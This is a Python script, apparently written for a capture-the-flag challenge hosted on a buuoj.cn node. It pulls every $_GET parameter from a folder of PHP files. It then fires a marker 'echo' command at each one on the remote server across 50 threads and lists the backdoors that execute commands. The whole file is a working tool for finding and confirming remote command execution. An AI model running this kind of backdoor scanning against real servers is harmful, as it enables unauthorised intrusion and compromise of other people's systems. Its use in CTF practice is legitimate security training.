import requests
import os
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://f7e37a03-c461-4d7f-bd04-a85e1baff6b5.node5.buuoj.cn:81"

def extract_all_backdoors():
    backdoors = []
    for filename in os.listdir('src'):
        if not filename.endswith('.php'):
            continue
        filepath = os.path.join('src', filename)
        with open(filepath, 'r', errors='ignore') as f:
            content = f.read()
        
        # Find all $_GET parameters used in dangerous contexts
        matches = re.findall(r"\$_GET\['([^']+)'\]", content)
        for param in matches:
            backdoors.append((filename, param))
    
    return list(set(backdoors))

def test_backdoor(filename, param):
    url = f"{BASE_URL}/{filename}"
    
    # Test with a unique marker that would appear in output
    test_cmd = "echo%20UNIQUEMARKER12345"
    
    try:
        resp = requests.get(url, params={param: test_cmd}, timeout=5)
        if "UNIQUEMARKER12345" in resp.text:
            return True, filename, param
    except:
        pass
    
    return False, filename, param

backdoors = extract_all_backdoors()
print(f"Testing {len(backdoors)} unique backdoors...")

found = []
with ThreadPoolExecutor(max_workers=50) as executor:
    futures = {executor.submit(test_backdoor, filename, param): (filename, param) for filename, param in backdoors}
    for i, future in enumerate(as_completed(futures)):
        if i % 1000 == 0:
            print(f"Progress: {i}/{len(backdoors)}")
        success, filename, param = future.result()
        if success:
            print(f"FOUND: {filename}?{param}")
            found.append((filename, param))

print(f"\nFound {len(found)} working backdoors")
